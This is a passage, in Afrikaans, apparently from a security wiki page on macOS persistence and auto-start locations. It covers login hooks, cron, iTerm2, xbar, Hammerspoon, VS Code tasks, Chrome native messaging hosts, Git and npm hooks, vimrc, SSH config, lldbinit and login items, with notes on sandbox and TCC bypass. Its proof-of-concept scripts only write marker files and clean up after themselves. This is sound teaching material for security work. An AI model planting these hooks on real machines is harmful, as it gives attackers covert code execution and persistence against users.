- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Jy moet iets soos `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` kan uitvoer
  - `Lo`geleë in `~/Library/Preferences/com.apple.loginwindow.plist`

Hulle is verouderd, maar kan gebruik word om opdragte uit te voer wanneer ’n gebruiker aanmeld.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Hierdie instelling word gestoor in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Om dit te verwyder:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Die root-gebruiker s’n word gestoor in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Voorwaardelike Sandbox Bypass

> [!TIP]
> Hier kan jy beginplekke vind wat nuttig is vir **sandbox bypass**, waardeur jy iets eenvoudig kan uitvoer deur dit **na ’n lêer te skryf** en **minder algemene toestande te verwag**, soos spesifieke **geïnstalleerde programme, “ongewone” gebruikeraksies** of omgewings.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Nuttig vir sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
  - Jy moet egter die `crontab`-binêre kan uitvoer
  - Of root wees
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/usr/lib/cron/tabs/`**
  - Root word vereis vir direkte skryftoegang. Root word nie vereis as jy `crontab <file>` kan uitvoer nie
  - **Sneller**: Die skedule in die geïnstalleerde crontab. `at` en `periodic` is afsonderlike meganismes hieronder.

#### Beskrywing en uitbuiting

Lys die cron-take van die **huidige gebruiker** met:

```bash
crontab -l
```

Die stelsel se cron-daemon se launchd-plist het ’n `QueueDirectories`-inskrywing vir `/usr/lib/cron/tabs`; daar word geïnstalleerde gebruiker-crontabs gehou. Om ander gebruikers se crontabs te inspekteer, vereis root:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

In ’n weggooibare rekening kan ’n gebruiker-cron-inskrywing wat slegs ’n merker bevat, met `crontab` geïnstalleer en verwyder word nadat dit waargeneem is. As jy `crontab <file>` uitvoer, **vervang dit die rekening se hele bestaande crontab**, dus stoor en herstel dit as die rekening nie weggooibaar is nie:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 het voorheen TCC-toestemmings gehad

#### Ligginge

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Sneller**: Begin iTerm2 met ’n geskikte Python API-script in daardie vouer
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Sneller**: Begin iTerm2; die AppleScript-opstart-hook word afsonderlik gedokumenteer
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Sneller**: Skep ’n sessie met die profiel waarvan die opdrag of aanvanklike teks die payload aanroep

#### Beskrywing & Uitbuiting

Die [huidige iTerm2 Python API-gids](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) dokumenteer outomatiese **Python**-skripte in `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Dit bevestig nie dat ’n arbitrêre uitvoerbare `.sh`-lêer in daardie vouer loop nie. Stoor dit vir ’n weggooibare rekening as `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

Die [huidige iTerm2 AppleScript-gids](https://iterm2.com/documentation-scripting.html) dokumenteer afsonderlik `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, met `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` as ’n terugval wanneer die moderne vouer nie bestaan nie. ’n AppleScript wat slegs ’n merker bevat, is:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Hierdie scriptvoorbeelde is aan iTerm2 se dokumentasie getoets, maar is nie in die aktiewe lessiesessie uitgevoer nie. Nadat jy dit in ’n tydelike rekening getoets het, verwyder die toetsscript en `/tmp/ht-iterm-autolaunch-marker` of `/tmp/iterm2-autolaunchscpt`, onderskeidelik.

Die iTerm2-voorkeure in **`~/Library/Preferences/com.googlecode.iterm2.plist`** kan ’n profielopdrag of aanvanklike teks spesifiseer. Laasgenoemde word in ’n sessie ingetik; uitvoering hang daarvan af of ’n shell dit interpreteer. [iTerm2 se profieldokumentasie](https://iterm2.com/documentation-preferences-profiles-general.html) beskryf die opdrag wat uitgevoer word wanneer ’n nuwe sessie met daardie profiel geskep word.

Hierdie instelling kan in die iTerm2-instellings opgestel word:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

En die opdrag word in die voorkeure weergegee:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Vir ’n veilige beoordeling, inspekteer die gekose profiel in iTerm2 se instellings of lees ’n kopie van die voorkeurlêer. As jy `Initial Text` in ’n aktiewe profiel verander, sal dit ’n gebruiker se sessies beïnvloed, daarom is geen voorkeur op die navorsings-Mac verander nie.

### xbar

Skryfstuk: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar xbar moet geïnstalleer wees
- TCC-omseiling: [✅](https://emojipedia.org/check-mark-button)
  - Dit versoek Accessibility-toestemmings

#### Ligging

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Sneller**: Sodra xbar uitgevoer word

#### Beskrywing

As die gewilde program [**xbar**](https://github.com/matryer/xbar) geïnstalleer is, is dit moontlik om ’n shell script in **`~/Library/Application\ Support/xbar/plugins/`** te skryf wat uitgevoer sal word wanneer xbar begin:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar Hammerspoon moet geïnstalleer wees
- TCC-omseiling: [✅](https://emojipedia.org/check-mark-button)
  - Dit versoek Toeganklikheidstoestemmings

#### Ligging

- **`~/.hammerspoon/init.lua`**
  - **Sneller**: Sodra hammerspoon uitgevoer word

#### Beskrywing

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dien as ’n outomatiseringsplatform vir **macOS** en gebruik die **LUA-skriptaal** vir sy bewerkings. Dit ondersteun veral die integrasie van volledige AppleScript-kode en die uitvoering van shell scripts, wat sy skripvermoëns aansienlik uitbrei.<sup>[[13]](#references)</sup>

Die toepassing soek na een lêer, `~/.hammerspoon/init.lua`, en wanneer dit begin word, sal die skrip uitgevoer word.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
  - Maar BetterTouchTool moet geïnstalleer wees
- TCC-bypass: [✅](https://emojipedia.org/check-mark-button)
  - Dit vra vir Automation- en Accessibility-toestemmings

#### Ligging

- ’n Skriplêer waarna ’n geaktiveerde BetterTouchTool-voorinstelling **reeds verwys**, of daardie voorinstelling se konfigurasie onder `~/Library/Application Support/BetterTouchTool/`. Die presiese skrippad hang af van hoe die voorinstelling opgestel is.

[BetterTouchTool se aksieverwysing](https://docs.folivora.ai/docs/actions/action-definitions/) dokumenteer dopskrip- en agtergrondopdragaksies. Die opgestelde sleutelbord-, muis-, raak-, legstuk- of ander gebeurtenis moet plaasvind terwyl die betrokke voorinstelling aktief is; [die gids vir snellers](https://docs.folivora.ai/docs/configuration/new-trigger/) wys hoe dit gekoppel word. ’n Willekeurige lêer in die toepassingsondersteuningsgids is nie ’n sneller nie. ’n Reeds opgestelde aksie wat ’n eksterne skryfbare skrip laai, is ’n meer beperkte skryf-na-uitvoering-teiken. Kode loop onder die BetterTouchTool-gebruiker se rekening, onderhewig aan sy werklike macOS-toestemmings. BetterTouchTool was nie in `/Applications` op die navorsings-Mac nie, dus is geen voorinstelling plaaslik verander of uitgevoer nie.

### Alfred

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
  - Maar Alfred moet geïnstalleer wees
- TCC-bypass: [✅](https://emojipedia.org/check-mark-button)
  - Dit vra vir Automation-, Accessibility- en selfs Full-Disk Access-toestemmings

#### Ligging

- ’n Skrip of lêer waarna ’n geïnstalleerde Alfred-werkvloei **reeds verwys**, of daardie werkvloei binne die gebruiker se opgestelde `Alfred.alfredpreferences`-gids. Die voorkeuregids kan gesinkroniseer wees en is nie ’n vaste universele pad nie.

[Alfred se werkvloeigids](https://www.alfredapp.com/help/workflows/) beskryf die Powerpack-voorvereiste en installasie deur sy UI. ’n Geïnstalleerde werkvloei se snelsleutel, sleutelwoord of ander opgestelde sneller moet afgaan; [Alfred se voorbeeld van ’n snelsleutel](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) demonstreer ’n skripaksie. [Alfred se omgewingsverwysing](https://www.alfredapp.com/help/workflows/script-environment-variables/) stel die gekose voorkeurepad as `alfred_preferences` beskikbaar. Om ’n ongeregistreerde werkvloeilêer in ’n willekeurige gids te plaas, bewys nie dat dit geïnstalleer of uitgevoer sal word nie. Kode loop as die aangemelde Alfred-gebruiker, met sy werklike macOS-toestemmings. Alfred was nie in `/Applications` op die navorsings-Mac nie, dus is hierdie pad slegs op grond van dokumentasie beoordeel.

### Raycast Script Commands en uitbreidingverversing

- **Skryfteiken:** ’n Uitvoerbare skrip in ’n gids wat **reeds bygevoeg is** onder Raycast Settings → Script Commands. Raycast skandeer nie ’n willekeurige nuutgeskepte gids nie. [Raycast se gids vir Script Commands](https://manual.raycast.com/script-commands) dokumenteer gidsregistrasie.
- **Sneller en identiteit:** ’n Gebruiker roep die geïndekseerde opdrag aan, ’n opgestelde snelsleutel of fallback roep dit aan, of Raycast verfris ’n `inline`-skrip volgens die opgestelde `@raycast.refreshTime`. Die skrip loop as die aangemelde Raycast-gebruiker deur sy tolk. Die [stroomop-metadataverwysing](https://github.com/raycast/script-commands#metadata) beperk outomatiese verversing tot inline-opdragte, en [Raycast se uitbreidingsmanifes](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) ondersteun afsonderlik ’n `interval` vir geïnstalleerde `no-view`- of `menu-bar`-uitbreidingsopdragte. Om bloot ’n gewone skripopdrag by te voeg, skeduleer dit nie.

Vir ’n tydelike rekening met ’n geregistreerde skripgids is ’n inline-skrip wat slegs ’n merker skryf:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Stoor dit in die geregistreerde gids, maak dit uitvoerbaar en laat Raycast dit verfris. Verwyder dan daardie lêer en `/tmp/ht-raycast-refresh-marker`. Raycast is nie onder sy gewone `/Applications`-naam op die navorsings-Mac gevind nie, dus is dit deur dokumentasie ondersteun en nie plaaslik uitgevoer nie. Toeganklikheids-, outomatiserings- en lêertoestemmings bly onderhewig aan macOS-toestemmingsversoeke.

### Visual Studio Code outomatiese workspacetake

- **Skryfdoel:** `.vscode/tasks.json` binne ’n workspace wat die gebruiker sal oopmaak.
- **Sneller:** Wanneer daardie workspace in VS Code oopgemaak word, maar slegs as die vouer vertrou word **en** outomatiese take toegelaat is. ’n Onbetroubare workspace voer nooit outomatiese take uit nie; die verstekinstelling vra die gebruiker om toestemming voor die eerste outomatiese uitvoering. [VS Code-taakdokumentasie](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) en [Workspace Trust-dokumentasie](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) beskryf albei vereistes.
- **Uitvoeringsidentiteit:** Die VS Code-gebruikersrekening, deur die gekonfigureerde taakproses. Dit is toepassingspesifieke uitvoering, nie aanmeldingsvolharding nie.

Plaas in ’n **nuwe, weggooibare workspace** hierdie taak wat slegs ’n merker skep in `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Nadat jy die vertroude werkruimte oopgemaak en outomatiese take toegelaat het, kyk vir `.autostart-task-ran`. Verwyder die taakinskrywing en merker om op te ruim. **Dit is teen Microsoft se dokumentasie en die geïnstalleerde VS Code 1.139.1-bundel geverifieer; dit is nie in die aktiewe lessenaarsessie uitgevoer nie.**

### Chrome native messaging hosts

- **Skryfdoel:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` vir die huidige gebruiker, of `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` vir alle gebruikers (administrateur-skryftoegang benodig). Chromium en Chrome for Testing gebruik verskillende gidse; sien [Chrome's current path table](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Sneller:** ’n Geïnstalleerde Chrome-uitbreiding met die `nativeMessaging`-toestemming roep `chrome.runtime.connectNative()` of `chrome.runtime.sendNativeMessage()` met die presiese gasheernaam uit die manifest aan. Chrome begin dan die gasheeruitvoerbare lêer. Om Chrome bloot oop te maak, voer nie ’n willekeurige nuwe native host uit nie; om ’n manifest te skep sonder ’n uitbreiding wat dit aanroep, doen niks. [Chrome's native messaging guide](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) dokumenteer hierdie handdruk.
- **Uitvoeringsidentiteit:** Die Chrome-gebruikersrekening. Die manifest moet ’n absolute pad na ’n uitvoerbare lêer spesifiseer en die oorsprong van die uitbreiding wat dit aanroep, uitdruklik toelaat.

In ’n weggooibare blaaierrekening met ’n toetsuitbreiding demonstreer die volgende paar lêers die skakel van skryf na uitvoering. Die manifest se lêernaam moet met sy `name` ooreenstem, en `TEST_EXTENSION_ID` moet deur daardie uitbreiding se werklike ID vervang word:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Stoor hierdie JSON as `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Die uitvoerbare lêer wat slegs as merker dien en by die manifest se `path` geleë is, kan die volgende bevat:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Nadat die toetsuitbreiding `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` vanaf sy dienswerker of uitbreidingsbladsy aanroep, bewys die merker dat die host begin het. Hierdie minimale host implementeer nie Chrome se antwoordprotokol met ’n lengtevoorvoegsel nie, dus kan die uitbreiding ’n boodskapfout rapporteer nadat die merker geskryf is. Verwyder die toetsmanifest, host en merker om skoon te maak. Op macOS 26.5.2 was die Chrome-toepassing en albei manifestgidse teenwoordig; **die aktiewe Chrome-profiel is nie gewysig of gebruik nie**.

### Karabiner-Elements-opdragte vir sleutelgebeurtenisse

- **Teikenskryfligging:** `~/.config/karabiner/karabiner.json` in ’n rekening waar Karabiner-Elements geïnstalleer is en loop. [Karabiner se gids oor lêerliggings](https://karabiner-elements.pqrs.org/docs/json/location/) sê dat die toepassing hierdie lêer dophou en herlaai nadat dit geskryf is. JSON-lêers in `assets/complex_modifications` is slegs invoerbare voorafinstellings; om bloot ’n lêer daar te skryf, aktiveer nie ’n reël nie.
- **Sneller:** Die opgestelde sleutelgebeurtenis nadat die reël aktief is. Die verwysing vir [`to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) beskryf die uitvoering van opdragte. Dit is nie kode-uitvoering wanneer jy aanmeld of by elke lêerskrywing nie.
- **Uitvoeringsidentiteit:** Die aangemelde gebruiker wat Karabiner se gebruikersproses laat loop. Die toestemmingstoekennings en enige TCC-toegang daarvan hang af van die toepassing en weergawe.

Voeg vir ’n weggooitoetsrekening hierdie reëlobjek by die `complex_modifications.rules`-skikking van die geselekteerde profiel in `karabiner.json`, en behou die res van daardie profiel. Druk F18 om ’n onskadelike merker te skep en verwyder dan hierdie reël en die merker. Deur F18 te kies, vermy jy dat ’n gewone tiktoets vervang word:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements was nie op die macOS 26.5.2-toetsmasjien in `/Applications` geïnstalleer nie, dus is dit ’n dokumentasie-gesteunde PoC eerder as ’n plaaslike looptydresultaat.

### Git hooks in ’n plaaslike repository

- **Teikenskryfplek:** ’n Uitvoerbare hook soos `<repo>/.git/hooks/post-checkout`. As `core.hooksPath` reeds gestel is, gebruik eerder daardie gekonfigureerde gids. ’n Hook wat as ’n gewone nagespoorde bronlêer vasgelê is, word nie outomaties in ’n kloon geïnstalleer nie.
- **Sneller:** Die ooreenstemmende Git-bewerking. `post-checkout` loop byvoorbeeld ná `git checkout` of `git switch`, en kan ook ná ’n kloon of die skep van ’n worktree loop. [Git se hook-verwysing](https://git-scm.com/docs/githooks) lys die gebeurtenisse en vereiste uitvoerbare-bis; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) verander die opsoekgids.
- **Uitvoeringsidentiteit:** Die rekening wat Git uitvoer. Die hook kan slegs uitgevoer word as die repository se effektiewe hooks-gids skryfbaar is vir die akteur en die gebruiker later die toepaslike Git-bewerking uitvoer.

Hierdie marker-only PoC skep ’n volledig weggooibare repository, installeer een hook en skakel na ’n ander tak. Dit is suksesvol met Apple Git 2.50.1 op macOS 26.5.2 uitgevoer:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### npm-lifecycle-skripte in ’n projek

- **Skryfteiken:** Die `scripts`-map in ’n skryfbare projek se `package.json`, of ’n geïnstalleerde afhanklikheidspakket waarvan die gebruiker se lewensiklusskrip sal loop. Dit is ’n haakpunt in die ontwikkelingswerkvloei, nie uitvoering wanneer ’n gids oopgemaak word nie.
- **Sneller en identiteit:** ’n Latere `npm install` of `npm ci` met lewensiklusskripte toegelaat, voer `preinstall`, `install` en `postinstall` uit as die gebruiker wat npm aanroep. ’n Gewone `npm run <name>` voer ook ooreenstemmende `pre<name>`- en `post<name>`-skripte uit. [npm's lifecycle reference](https://docs.npmjs.com/cli/v11/using-npm/scripts) lys die gebeurtenisse; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) kan installasielewensiklusskripte onderdruk. Weergawe- en beleidsinstellings kan verander wat toegelaat word, dus moet jy die teiken se npm-weergawe nagaan.

Hierdie merker-alleen-PoC is met plaaslike npm in ’n weggooibare, leë gids uitgevoer. Dit laai nie afhanklikhede af of verander ’n gebruiker se projek nie:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Dit verskil van Python-interpretaar-opstartlêers: npm moet die betrokke installasie- of uitvoeraksie uitvoer, terwyl Python `site`-kode tydens ’n gewone interpreteerder-aanroep kan laai. Generiese `Makefile`-teikens en definisies van bou take vereis insgelyks dat die gebruiker of ’n reeds opgestelde hulpmiddel daardie teiken aanroep; dit is nie afsonderlike OS-outostartpaaie nie.

### Vim-opstartkonfigurasie

- **Skryf-teiken:** `~/.vimrc` vir die gebruiker wat Vim sal begin (of ’n ander opstartlêer wat deur Vim se initialiseringsvolgorde gekies word). [Vim se opstartverwysing](https://vimhelp.org/starting.txt.html) dokumenteer die lêer en die `VIMINIT`/`EXINIT`-oorrides.
- **Sneller:** ’n Latere gewone Vim-begin wat hierdie konfigurasie laai. Vim se `-u NONE` omseil die gebruiker se vimrc. Dit is editor-spesifieke uitvoering, nie ’n OS-aanmeldsneller nie.
- **Uitvoeringsidentiteit:** Die Vim-gebruikersrekening.

Die volgende geïsoleerde PoC is teen macOS se `/usr/bin/vim` uitgevoer; dit skryf geen werklike Vim-voorkeure of oop dokumente nie:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim het ’n aparte gebruikerskonfigurasiepad, `$XDG_CONFIG_HOME/nvim/init.lua` of `init.vim`, en laai ook skrifte in sy `plugin/`-runtime-gidse volgens sy [opstartdokumentasie](https://neovim.io/doc/user/starting/). Neovim was nie op die macOS 26.5.2-toetsmasjien geïnstalleer nie, dus is hierdie variant nie daar uitgevoer nie.

### SSH-kliëntkonfigurasie-opdragte

- **Teikenskryfplek:** `~/.ssh/config`, of ’n ander lêer wat dit reeds insluit. Dit is ’n konfigurasielêer vir die **kliënt**; dit is apart van die bedienerkant-`~/.ssh/rc` wat hieronder beskryf word.
- **Sneller:** ’n Ooreenstemmende `ssh`-aanroep. `Match exec` voer ’n plaaslike opdrag uit terwyl die kliënt sy konfigurasie evalueer, selfs met `ssh -G`, wat konfigurasie druk sonder om te koppel. `ProxyCommand` word uitgevoer wanneer die kliënt ’n ooreenstemmende verbinding opstel. `LocalCommand` word eers ná ’n suksesvolle verbinding uitgevoer en vereis `PermitLocalCommand yes` (die verstek is `no`). Dit gebeur op verskillende tydstippe en het verskillende voorvereistes; ’n skryfbewerking alleen voer dit nie uit nie. Sien die stroomop- [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Uitvoeringsidentiteit:** Die plaaslike gebruiker wat `ssh` uitvoer. ’n Ooreenstemmende gasheer, ’n toepaslike konfigurasielêer en enige vereiste verbinding is nodig. `ssh -F` kan ’n ander konfigurasielêer kies.

Hierdie merker-alleen-PoC is met Apple se SSH-kliënt op macOS 26.5.2 uitgevoer. `-G` toets `Match exec` sonder om ’n netwerkverbinding te maak of die gebruiker se werklike SSH-konfigurasie te lees:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Ontfouter-inisialiseringslêers

- **Skryfdoelwit:** `~/.lldbinit` of die lêer met hoër prioriteit wat spesifiek vir die toepassing is, soos `~/.lldbinit-lldb`. LLDB lees een wanneer die ontfouter begin. ’n `.lldbinit` in die huidige gids word **nie** by verstek uitgevoer nie; die gebruiker moet `target.load-cwd-lldbinit` aktiveer of `--local-lldbinit` deurgee. Sien die [LLDB-handleiding](https://lldb.llvm.org/man/lldb.html).
- **Sneller en identiteit:** Die gebruiker begin LLDB sonder `--no-lldbinit`; opdragte loop as daardie gebruiker. Om bloot ’n projek oop te maak, beteken nie dat die projek se `.lldbinit` loop nie.

Die volgende merker-alleen-toets is op LLDB op macOS 26.5.2 uitgevoer, met ’n geïsoleerde tuisgids en werkgids:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB** lys die [upstream-opstartdokumentasie](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) `$HOME/Library/Preferences/gdb/gdbinit` en daarna `~/.gdbinit` op macOS. ’n `.gdbinit` in die huidige gids is onderhewig aan die [outo-laai-veilige pad](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), en `-nx`/`-nh` onderdruk inisialisasielêers. GDB was nie op die toets-Mac geïnstalleer nie, dus is hierdie variant nie plaaslik uitgevoer nie.

### SSHRC

Skrywe: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar ssh moet geaktiveer en gebruik word
- TCC-omseiling: [✅](https://emojipedia.org/check-mark-button)
  - SSH-gebruik om FDA-toegang te hê

#### Ligging

- **`~/.ssh/rc`**
  - **Sneller**: Aanmelding via ssh
- **`/etc/ssh/sshrc`**
  - Root word vereis
  - **Sneller**: Aanmelding via ssh

> [!CAUTION]
> Om ssh aan te skakel, word Full Disk Access vereis:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Beskrywing & Uitbuiting

By verstek, tensy `PermitUserRC no` in `/etc/ssh/sshd_config` gestel is, word die skripte **`/etc/ssh/sshrc`** en **`~/.ssh/rc`** uitgevoer wanneer ’n gebruiker **via SSH aanmeld**.<sup>[[14]](#references)</sup>

### **Aantekenitems**

Write-up: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar jy moet `osascript` met argumente uitvoer
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Liggings

- **Geregistreerde helper-app vir aantekenitems:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (algemene gebundelde ligging).
  - **Sneller:** Registrasie kan die helper onmiddellik laat begin; daarna begin dit met latere gebruikersaanmeldings, onderhewig aan goedkeuring.
- **Geregistreerde gebundelde agent/daemon:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` of `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Sneller:** ’n Goedgekeurde agent kan met registrasie en tydens latere aanmeldings begin; ’n goedgekeurde daemon begin tydens selflaai. ’n Daemon vereis administrateurgoedkeuring.

#### Beskrywing

In **Stelselinstellings → Algemeen → Aantekenitems en uitbreidings** kan gebruikers aanteken- en agtergronditems nagaan. macOS 13 en later bied [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) om gebundelde aantekenitems, launch agents en launch daemons te registreer. Die gedrag van [`register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) verskil na gelang van die tipe en goedkeuringstatus. **Om ’n helper in ’n app-bundel te plaas, is nie genoeg om ’n nuwe aantekenitem te registreer nie.** Omgekeerd, as ’n reeds geregistreerde helper-uitvoerbare lêer skryfbaar is, kan die verandering van daardie lêer die volgende keer dat dit begin word ’n uitwerking hê sonder nuwe registrasie; verifieer eers die werklike pad en kodeondertekeningskontroles.

Die volgende is ’n leesalleen-manier om na gebundelde helpers op ’n Mac te soek; dit registreer of begin nie enige daarvan nie:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

